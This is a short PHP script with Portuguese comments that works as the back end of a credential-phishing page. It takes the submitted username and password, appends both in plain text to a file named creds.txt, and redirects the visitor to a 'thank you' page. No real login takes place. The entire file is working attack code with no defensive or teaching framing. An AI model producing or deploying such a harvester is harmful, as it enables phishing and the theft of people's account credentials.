<?php
$user = $_POST['username'];
$pass = $_POST['password'];

file_put_contents("creds.txt", "Usuario: $user | Senha: $pass\n", FILE_APPEND);

// Redireciona para uma página qualquer
header("Location: obrigado.html");
exit();
?>
